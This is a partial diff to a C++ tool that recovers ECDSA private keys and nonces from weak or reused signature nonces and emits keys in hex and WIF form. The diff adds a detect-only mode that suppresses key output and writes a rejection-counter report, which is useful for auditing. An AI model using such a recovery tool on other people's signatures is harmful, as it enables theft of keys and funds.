                     hits.fetch_add(1);
                     break;
                 }
@@ -1453,22 +1551,30 @@ static size_t seed_from_known_privs(const std::string& sigs_path,
             std::string nkhex = hex_lower(nk32.data(), 32);
 
             auto& S = by_r[rhex];
-            S.insert(khex); S.insert(nkhex);
+            if(G_DETECT_ONLY){
+                GDIAG.k_output_suppressed += 2;
+            }else{
+                S.insert(khex); S.insert(nkhex);
+            }
             k_accepted++;
 
             if(!wrote_pub.count(pub)){
                 wrote_pub.insert(pub);
                 std::string priv_hex = hex_lower(pe.d.data(),32);
-                GOUT.emit_unique_key(
-                    out_json_path,
-                    out_txt_path,
-                    pub,
-                    priv_hex,
-                    std::string("{\"pubkey\":\"") + pub + "\",\"priv_hex\":\"" + priv_hex +
-                    "\"," + wif_json_fields(priv_hex) + ",\"method\":\"seed-from-known-priv\"}",
-                    std::string("PUB=") + pub + " PRIV=" + priv_hex + " " +
-                    wif_txt_fields(priv_hex) + " (seed-from-known-priv)"
-                );
+                if(G_DETECT_ONLY){
+                    GDIAG.private_output_suppressed++;
+                }else{
+                    GOUT.emit_unique_key(
+                        out_json_path,
+                        out_txt_path,
+                        pub,
+                        priv_hex,
+                        std::string("{\"pubkey\":\"") + pub + "\",\"priv_hex\":\"" + priv_hex +
+                        "\"," + wif_json_fields(priv_hex) + ",\"method\":\"seed-from-known-priv\"}",
+                        std::string("PUB=") + pub + " PRIV=" + priv_hex + " " +
+                        wif_txt_fields(priv_hex) + " (seed-from-known-priv)"
+                    );
+                }
             }
             BN_free(br); BN_free(bs); BN_free(bz); BN_free(bd);
             BN_free(tmp); BN_free(k); BN_free(invS); BN_free(nk);
@@ -1578,6 +1684,7 @@ static size_t load_recovered_keys_into_store(const string& path, RecStore& store
     return seeded;
 }
 
+
 // ------------------------------- CLI / Args -------------------------------
 struct Args {
     string sigs="signatures.jsonl";
@@ -1591,6 +1698,8 @@ struct Args {
     string preload_priv="";
     string preload_recovered="";
     string bucket_mode="rprefix";
+    string rejection_report="recovery_rejection_report.json";
+    bool detect_only=false;
     int threads=max(1,(int)thread::hardware_concurrency());
     int max_iter=2;
     int min_count=0;
@@ -1612,6 +1721,75 @@ struct Args {
     uint64_t scan_random_k_range=32;
     uint64_t rand_seed=1;
 };
+static void write_diag_report(const string& path, const Args& A,
+                              size_t total_dupR, size_t total_delta, size_t total_reflected_delta,
+                              size_t total_delta_nopub, size_t total_lcg, size_t total_random_k,
+                              size_t total_pairs_tested)
+{
+    if(path.empty()) return;
+    ofstream out(path);
+    if(!out.good()) return;
+    auto v = [](const atomic<size_t>& x){ return x.load(); };
+    out << "{\n";
+    out << "  \"detect_only\": " << (G_DETECT_ONLY ? "true" : "false") << ",\n";
+    out << "  \"input\": \"" << A.sigs << "\",\n";
+    out << "  \"bucket_mode\": \"" << A.bucket_mode << "\",\n";
+    out << "  \"total_pairs_tested\": " << total_pairs_tested << ",\n";
+    out << "  \"stage_hits\": {"
+        << "\"dupR\":" << total_dupR
+        << ",\"delta\":" << total_delta
+        << ",\"reflected_delta\":" << total_reflected_delta
+        << ",\"delta_nopub\":" << total_delta_nopub
+        << ",\"lcg\":" << total_lcg
+        << ",\"random_k\":" << total_random_k << "},\n";
+    out << "  \"suppressed\": {"
+        << "\"private_outputs\":" << v(GDIAG.private_output_suppressed)
+        << ",\"k_outputs\":" << v(GDIAG.k_output_suppressed) << "},\n";
+    out << "  \"primary\": {"
+        << "\"pairs\":" << v(GDIAG.primary_pairs)
+        << ",\"denom_zero\":" << v(GDIAG.primary_denom_zero)
+        << ",\"inverse_fail\":" << v(GDIAG.primary_inverse_fail)
+        << ",\"k_zero\":" << v(GDIAG.primary_k_zero)
+        << ",\"r_from_k_mismatch\":" << v(GDIAG.primary_r_from_k_mismatch)
+        << ",\"ecdsa_fail\":" << v(GDIAG.primary_ecdsa_fail)
+        << ",\"pubkey_mismatch\":" << v(GDIAG.primary_pubkey_mismatch)
+        << ",\"valid_candidates\":" << v(GDIAG.primary_valid_candidates) << "},\n";
+    out << "  \"delta\": {"
+        << "\"candidates\":" << v(GDIAG.delta_candidates)
+        << ",\"ecdsa_fail\":" << v(GDIAG.delta_ecdsa_fail)
+        << ",\"r_from_k_mismatch\":" << v(GDIAG.delta_r_from_k_mismatch)
+        << ",\"pubkey_mismatch\":" << v(GDIAG.delta_pubkey_mismatch)
+        << ",\"valid_candidates\":" << v(GDIAG.delta_valid_candidates) << "},\n";
+    out << "  \"reflected_delta\": {"
+        << "\"candidates\":" << v(GDIAG.reflected_candidates)
+        << ",\"relation_fail\":" << v(GDIAG.reflected_relation_fail)
+        << ",\"ecdsa_fail\":" << v(GDIAG.reflected_ecdsa_fail)
+        << ",\"r_from_k_mismatch\":" << v(GDIAG.reflected_r_from_k_mismatch)
+        << ",\"pubkey_mismatch\":" << v(GDIAG.reflected_pubkey_mismatch)
+        << ",\"valid_candidates\":" << v(GDIAG.reflected_valid_candidates) << "},\n";
+    out << "  \"lcg\": {"
+        << "\"candidates\":" << v(GDIAG.lcg_candidates)
+        << ",\"denom_zero\":" << v(GDIAG.lcg_denom_zero)
+        << ",\"inverse_fail\":" << v(GDIAG.lcg_inverse_fail)
+        << ",\"ecdsa_fail\":" << v(GDIAG.lcg_ecdsa_fail)
+        << ",\"r_from_k_mismatch\":" << v(GDIAG.lcg_r_from_k_mismatch)
+        << ",\"pubkey_mismatch\":" << v(GDIAG.lcg_pubkey_mismatch)
+        << ",\"valid_candidates\":" << v(GDIAG.lcg_valid_candidates) << "},\n";
+    out << "  \"propagate\": {"
+        << "\"known_priv_rows\":" << v(GDIAG.propagate_known_priv_rows)
+        << ",\"known_k_rows\":" << v(GDIAG.propagate_known_k_rows)
+        << ",\"r_from_k_mismatch\":" << v(GDIAG.propagate_r_from_k_mismatch)
+        << ",\"pubkey_mismatch\":" << v(GDIAG.propagate_pubkey_mismatch)
+        << ",\"valid_candidates\":" << v(GDIAG.propagate_valid_candidates) << "},\n";
+    out << "  \"random_k\": {"
+        << "\"candidates\":" << v(GDIAG.random_candidates)
+        << ",\"r_from_k_mismatch\":" << v(GDIAG.random_r_from_k_mismatch)
+        << ",\"pubkey_mismatch\":" << v(GDIAG.random_pubkey_mismatch)
+        << ",\"valid_candidates\":" << v(GDIAG.random_valid_candidates) << "}\n";
+    out << "}\n";
+}
+
+
 static vector<uint64_t> parse_list_u64(const string& s){
     vector<uint64_t> v; if(s.empty()) return v;
     string tmp; stringstream ss(s);
@@ -1635,6 +1813,8 @@ static void usage(){
 "  --preload-priv FILE              known private keys (WIF/hex/decimal) -> seed r->k & recovered_keys\n"
 "  --preload-recovered FILE         preload recovered_keys.jsonl into recovery graph and output dedup state\n"
 "  --bucket-mode MODE               pass0 bucket mode: rprefix or pub (default rprefix)\n"
+"  --detect-only                    validate recovery conditions but do not write priv/WIF/k artifacts\n"
+"  --rejection-report FILE          write diagnostic rejection counters (default recovery_rejection_report.json)\n"
 "\n  --dg-max-delta M                 max δ (default 4096)\n"
 "  --dg-seeds a,b,c                 gradient seeds\n"
 "  --dg-fill-step S                 fill step (default 8)\n"
@@ -1670,6 +1850,8 @@ static bool parse_args(int argc,char**argv, Args& A){
         else if(k=="--preload-k"){ if(!need(A.preload_k)) return false; }
         else if(k=="--preload-priv"){ if(!need(A.preload_priv)) return false; }
         else if(k=="--preload-recovered"){ if(!need(A.preload_recovered)) return false; }
+        else if(k=="--detect-only"){ A.detect_only=true; }
+        else if(k=="--rejection-report"){ if(!need(A.rejection_report)) return false; }
         else if(k=="--bucket-mode"){
             if(!need(A.bucket_mode)) return false;
             if(A.bucket_mode!="rprefix" && A.bucket_mode!="pub"){
@@ -1724,6 +1906,10 @@ int main(int argc, char** argv){
 
     Args A;
     if(!parse_args(argc,argv,A)) return 1;
+    G_DETECT_ONLY = A.detect_only;
+    if(G_DETECT_ONLY){
+        cerr << "[detect-only] private key, WIF, and k outputs are suppressed\n";
+    }
 
     // Preserve prior recovery output across reruns and avoid re-emitting the same key pairs.
     GOUT.preload_existing(A.out_json);
@@ -1976,7 +2162,7 @@ int main(int argc, char** argv){
         if(grew_k_sum==0 && grew_d_sum==0) break;
     }
 
-    size_t flushed_k_rows = flush_k_snapshot(A.out_k, store);
+    size_t flushed_k_rows = G_DETECT_ONLY ? 0 : flush_k_snapshot(A.out_k, store);
     if(flushed_k_rows > 0){
         cerr<<"[out-k] snapshot_rows="<<flushed_k_rows<<" path="<<A.out_k<<"\n";
     }
@@ -1992,6 +2178,18 @@ int main(int argc, char** argv){
         <<" lcg_hits="<<total_lcg
         <<" random_k_hits="<<total_random_k
         <<" pairs_tested="<<total_pairs_tested<<"\n";
+    write_diag_report(
+        A.rejection_report,
+        A,
+        total_dupR,
+        total_delta,
+        total_reflected_delta,
+        total_delta_nopub,
+        total_lcg,
+        total_random_k,
+        total_pairs_tested
+    );
+    if(!A.rejection_report.empty()) cerr << "[diag] rejection_report=" << A.rejection_report << "\n";
     cerr<<"Done.\n";
     return 0;
 }
